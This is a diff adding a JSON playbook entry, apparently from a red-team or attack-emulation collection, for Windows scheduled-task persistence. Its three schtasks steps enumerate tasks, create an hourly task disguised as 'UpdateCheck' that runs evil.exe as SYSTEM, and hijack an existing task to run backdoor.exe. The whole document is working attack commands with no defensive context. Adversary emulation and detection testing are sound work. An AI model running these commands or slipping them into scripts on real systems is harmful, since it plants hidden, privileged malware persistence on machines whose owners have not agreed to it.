@@ -1,0 +1,25 @@
+{
+	"name": "Scheduled Task Persistence & Execution",
+	"description": "Create or modify scheduled tasks for code execution.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "List Tasks",
+			"command": "schtasks /query /fo LIST /v",
+			"description": "Enumerate all scheduled tasks."
+		},
+		{
+			"index": 2,
+			"name": "Create Malicious Task",
+			"command": "schtasks /create /sc hourly /tn \"UpdateCheck\" /tr \"C:\\temp\\evil.exe\" /ru SYSTEM",
+			"description": "Run as SYSTEM every hour."
+		},
+		{
+			"index": 3,
+			"name": "Modify Existing Task",
+			"command": "schtasks /change /tn \"OldTask\" /tr \"C:\\temp\\backdoor.exe\"",
+			"description": "Hijack legitimate task."
+		}
+	]
+}
